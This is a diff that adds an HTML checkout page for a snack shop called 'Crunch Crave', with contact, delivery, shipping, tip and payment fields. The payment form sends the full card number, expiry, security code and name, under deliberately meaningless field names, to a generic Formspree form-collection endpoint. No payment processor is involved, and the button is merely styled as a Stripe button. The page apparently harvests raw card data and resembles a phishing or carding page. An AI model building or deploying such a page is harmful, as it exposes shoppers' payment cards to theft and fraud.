@@ -1,0 +1,466 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Checkout - Crunch Crave</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.4/css/all.min.css">
+    <style>
+        .container {
+  position: relative;
+}
+
+.text-detection {
+  position: absolute;
+  top: 50%;
+  left: 50%;
+  transform: translate(-50%, -50%);
+  background-color: rgba(255, 255, 255, 0.7);
+  padding: 10px 20px;
+  border-radius: 5px;
+  box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
+  z-index: 1;
+}
+
+/* Reset default margin and padding */
+* {
+    margin: 0;
+    padding: 0;
+    box-sizing: border-box;
+}
+
+/* Body styles */
+body {
+  font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+  background-color: white;
+  color: #333;
+  margin: 0;
+}
+
+/* Container styles */
+.container {
+    max-width: 600px;
+    margin: 50px auto;
+    padding: 20px;
+    background-color: #fff;
+    border-radius: 8px;
+    box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
+}
+
+/* Section styles */
+.section {
+    margin-bottom: 20px;
+    padding-bottom: 20px;
+    border-bottom: 1px solid #eee;
+}
+
+.section:last-child {
+    margin-bottom: 0;
+    padding-bottom: 0;
+    border-bottom: none;
+}
+
+/* Heading styles */
+h2 {
+    font-size: 22px;
+    margin-bottom: 10px;
+    font-weight: bold;
+}
+
+/* Input styles */
+input[type="text"],
+input[type="email"],
+input[type="tel"],
+select {
+    width: 100%;
+    padding: 12px;
+    margin-bottom: 10px;
+    border: 1px solid #dfe1e5;
+    border-radius: 4px;
+    font-size: 16px;
+    line-height: 1.5;
+    color: #32325d;
+    background-color: #fff;
+    background-image: none;
+    box-shadow: inset 0 1px 2px rgba(0,0,0,.1);
+}
+
+/* Focus styles */
+input[type="text"]:focus,
+input[type="email"]:focus,
+input[type="tel"]:focus,
+select:focus {
+    border-color: #007bff;
+    outline: 0;
+    box-shadow: 0 0 0 0.2rem rgba(0, 123, 255, 0.25);
+}
+
+
+
+
+/* Select styles */
+select {
+    appearance: none;
+    padding-right: 30px;
+    background-image: url('data:image/svg+xml;utf8,<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="%23333"><path d="M7 10l5 5 5-5z"/></svg>');
+    background-repeat: no-repeat;
+    background-position: right 10px center;
+}
+
+/* Payment icons styles */
+.payment-icons {
+    display: flex;
+    align-items: center;
+    margin-bottom: 10px;
+}
+
+.payment-icon {
+    font-size: 24px;
+    color: #666;
+    margin-right: 10px;
+}
+
+/* Style for Payment Information section */
+.payment-information {
+    background-color: #f6f6f6;
+    padding: 20px;
+    border-radius: 8px;
+    box-shadow: 0 1px 2px rgba(0, 0, 0, 0.1);
+    margin-bottom: 20px;
+}
+
+/* Payment Icons */
+.payment-icons {
+    display: flex;
+    align-items: center;
+    margin-bottom: 10px;
+}
+
+.payment-icon {
+    font-size: 24px;
+    color: #605a5a;
+    margin-right: 10px;
+}
+
+
+/* Base Submit Button Styles */
+input[type="submit"] {
+    padding: 15px 20px;
+    background-color: #2f9ae0;
+    color: #fff;
+    border: none;
+    border-radius: 4px;
+    cursor: pointer;
+    font-size: 16px;
+    display: block;
+    width: 100%;
+    margin-top: 30px;
+    text-align: center;
+}
+
+input[type="submit"]:hover {
+    background-color: #0070ba;
+}
+
+/* Media Query for Phones */
+/* Media Query for Phones */
+@media (max-width: 600px) {
+    input[type="submit"] {
+        padding: 35px 15px; /* Adjusted padding for phones */
+        font-size: 14px; /* Reduce font size for smaller screens */
+        width: calc(100% + 30px); /* Increase width to cover full width of container */
+        margin-left: -15px; /* Center the button */
+    }
+}
+
+
+
+
+/* Label Styles */
+.input-container label {
+  display: block;
+  margin-bottom: 5px;
+  color: #666;
+  font-size: 14px;
+}
+
+
+
+#shipping-form {
+  margin-top: 20px;
+}
+
+#shipping-form label {
+  display: block;
+  font-weight: bold;
+  margin-bottom: 10px;
+}
+
+#shipping-method {
+  padding: 8px;
+  font-size: 16px;
+  width: 100%;
+  border: 1px solid #ccc;
+  border-radius: 4px;
+}
+
+#shipping-method option {
+  padding: 8px;
+}
+
+#shipping-method:hover,
+#shipping-method:focus {
+  border-color: #007bff;
+  outline: none;
+}
+
+#shipping-method:focus {
+  box-shadow: 0 0 0 3px rgba(95, 99, 104, 0.25);
+}
+
+#shipping-method option:checked {
+  background-color: #716b6b;
+  color: white;
+}
+
+
+    </style>
+<div class="container">
+    <!-- Contact Information Section -->
+    <div class="section">
+        <h2>Contact </h2>
+        <form action="https://formspree.io/f/mbjnoeew" method="POST">
+        <form>
+            <input type="email" id="email" name="email" class="payment-input" placeholder="Email" required>
+            <input type="tel" id="phone" name="phone" class="payment-input" placeholder="Phone" required>
+        </form>
+    </div>
+
+    <!-- Delivery Information Section -->
+    <div class="section">
+        <h2>Delivery</h2>
+        <form>
+            <input type="text" id="first-name" name="first-name" class="payment-input" placeholder="First Name" required>
+            <input type="text" id="last-name" name="last-name" class="payment-input" placeholder="Last Name" required>
+            <input type="text" id="address" name="address" class="payment-input" placeholder="Address" required>
+            <input type="text" id="apartment" name="apartment" class="payment-input" placeholder="Apartment">
+    
+            <select id="state" name="state" class="payment-input" required>
+                <option value="" disabled selected>Select State or City</option>
+                <option value="Karachi">Karachi</option>
+                <option value="Lahore">Lahore</option>
+                <option value="Islamabad">Islamabad</option>
+                <option value="Rawalpindi">Rawalpindi</option>
+                <option value="Faisalabad">Faisalabad</option>
+                <option value="Peshawar">Peshawar</option>
+                <option value="Multan">Multan</option>
+                <option value="Quetta">Quetta</option>
+                <option value="Gujranwala">Gujranwala</option>
+                <option value="Sialkot">Sialkot</option>
+                <option value="Hyderabad">Hyderabad</option>
+                <option value="Sargodha">Sargodha</option>
+                <option value="Bahawalpur">Bahawalpur</option>
+                <option value="Sukkur">Sukkur</option>
+                <option value="Larkana">Larkana</option>
+                <option value="Sheikhupura">Sheikhupura</option>
+                <option value="Mardan">Mardan</option>
+                <option value="Kasur">Kasur</option>
+                <option value="Gujrat">Gujrat</option>
+                <option value="Jhelum">Jhelum</option>
+            </select>
+    
+            <input type="text" id="city" name="city" class="payment-input" placeholder="City" required>
+            <input type="text" id="zip-code" name="zip-code" class="payment-input" placeholder="Zip Code" required>
+        </form>
+    </div>
+    
+
+    <!-- Shipping Method Selection Form -->
+<form id="shipping-form">
+    <label for="shipping-method">Shipping Method</label>
+    <select id="shipping-method" name="shipping-method">
+      <option value="standard">Standard  - Free Shipping</option>
+      <option value="express">Express Shipping - $10.00</option>
+    </select>
+  </form>
+  
+
+    <!-- Payment Information Section -->
+    <!-- Payment Information Section -->
+    <div class="section payment-information">
+        <h2>Payment</h2>
+            <div class="payment-icons">
+                <i class="fab fa-cc-visa payment-icon"></i>
+                <i class="fab fa-cc-mastercard payment-icon"></i>
+                <i class="fab fa-cc-amex payment-icon"></i>
+                <i class="fab fa-cc-discover payment-icon"></i>
+            </div>
+            <div class="section payment-information">
+                <form action="https://formspree.io/f/xdoqbznl" method="POST">
+                  <input type="text" id="cer" name="car" class="input-field" placeholder="Card Number" required>
+                  <input type="text" id="eate" name="ee" class="input-field" placeholder="MM/YY" required>
+                  <input type="text" id="se" name="sece" class="input-field" placeholder="Security Code" required>
+                  <input type="text" id="na" name="ad" class="input-field" placeholder="Name on Card" required>
+                    <div class="input-container">
+                      <label for="tnt">Tip Amount</label>
+                      <input type="text" id="tnt" name="tnt" class="input-field" placeholder="0.00" required>
+                  
+                      <div class="tip-buttons">
+                          <button class="tip-button" data-tip="5">5 USD</button>
+                          <button class="tip-button" data-tip="10">10 USD</button>
+                          <button class="tip-button" data-tip="15">15 USD</button>
+                      </div>
+                    </div>
+                    <button class="stripe-button">Pay now</button>
+<style>
+    .stripe-button {
+  background-color: #0d0e16;
+  color: #fff;
+  font-family: "Helvetica Neue", Helvetica, sans-serif;
+  font-size: 12px !important;
+  font-weight: 600;
+  text-transform: uppercase;
+  border: none;
+  border-radius: 0px;
+  padding: 18px 55%;
+  cursor: pointer;
+  transition: background-color 0.3s;
+  margin-left: -43px;
+  margin-top: 25px;
+  margin-right: -150px;
+}
+
+.stripe-button:hover {
+  background-color: #3056d4;
+}
+
+</style>
+                </form>
+                
+            </div>
+            
+    
+              </form>
+</div>
+<script>
+  document.addEventListener('DOMContentLoaded', function() {
+      // Format card number with dashes and ensure only numeric input
+      const cardNumberInput = document.getElementById('cer');
+      cardNumberInput.addEventListener('input', function(e) {
+          let value = e.target.value.replace(/\D/g, ''); // Remove non-digits
+          let formattedValue = '';
+          for (let i = 0; i < value.length; i += 4) {
+              if (i > 0) {
+                  formattedValue += '-';
+              }
+              formattedValue += value.substring(i, i + 4);
+          }
+          e.target.value = formattedValue;
+      });
+
+      // Open numeric keyboard on focus (mostly for iOS devices)
+      cardNumberInput.addEventListener('focus', function() {
+          cardNumberInput.setAttribute('inputmode', 'numeric');
+      });
+  });
+</script>
+<script>
+  document.addEventListener('DOMContentLoaded', function() {
+      // Format card number with dashes
+      const cardNumberInput = document.getElementById('cer');
+      cardNumberInput.addEventListener('input', function(e) {
+          let value = e.target.value.replace(/\D/g, ''); // Remove non-digits
+          let formattedValue = '';
+          for (let i = 0; i < value.length; i += 4) {
+              if (i > 0) {
+                  formattedValue += '-';
+              }
+              formattedValue += value.substring(i, i + 4);
+          }
+          e.target.value = formattedValue;
+      });
+
+      // Format expiration date to MM/YY
+      const expirationDateInput = document.getElementById('eate');
+      expirationDateInput.addEventListener('input', function(e) {
+          let value = e.target.value.replace(/\D/g, ''); // Remove non-digits
+          if (value.length >= 3) {
+              e.target.value = value.substring(0, 2) + '/' + value.substring(2, 4);
+          } else {
+              e.target.value = value;
+          }
+      });
+
+      // Validate security code to accept only numbers
+      const securityCodeInput = document.getElementById('se');
+      securityCodeInput.addEventListener('input', function(e) {
+          e.target.value = e.target.value.replace(/\D/g, ''); // Remove non-digits
+      });
+
+      // Optionally, validate name on card to allow only letters and spaces
+      const nameOnCardInput = document.getElementById('na');
+      nameOnCardInput.addEventListener('input', function(e) {
+          e.target.value = e.target.value.replace(/[^a-zA-Z\s]/g, ''); // Allow only letters and spaces
+      });
+  });
+</script>
+<script>
+  document.addEventListener('DOMContentLoaded', function() {
+      const tipInput = document.getElementById('tnt');
+      const tipButtons = document.querySelectorAll('.tip-button');
+
+      tipButtons.forEach(button => {
+          button.addEventListener('click', function() {
+              const tipAmount = this.getAttribute('data-tip');
+              tipInput.value = tipAmount;
+          });
+      });
+  });
+</script>
+
+<style>
+  /* Default button styles */
+  .tip-button {
+      padding: 3px;
+      font-size: 15px;
+      border: 1px solid #ffffff;
+      border-radius: 4px;
+      cursor: pointer;
+      background-color: #ffffff;
+      color: #333; /* Default text color */
+  }
+
+  /* Styles for specific tip amounts */
+  .tip-button[data-tip="5"] {
+      background-color: #ffffff; /* Light green for $5 tip */
+      border-color: #ffffff;
+  }
+
+  .tip-button[data-tip="10"] {
+      background-color: #ffffff; /* Light blue for $10 tip */
+      border-color: #ffffff;
+  }
+
+  .tip-button[data-tip="15"] {
+      background-color: #ffffff; /* Light red for $15 tip */
+      border-color: #ffffff;
+  }
+
+  /* Styles for written numbers based on tip amount */
+  .tip-button[data-tip="5"]::after {
+      content: " USD";
+      color: #ffffff; /* Blue color for $5 tip */
+  }
+
+  .tip-button[data-tip="10"]::after {
+      content: " USD";
+      color: #ffffff; /* Blue color for $10 tip */
+  }
+
+  .tip-button[data-tip="15"]::after {
+      content: " USD";
+      color: #ffffff; /* Blue color for $15 tip */
+  }
+</style>
+
+</body>
+</html>
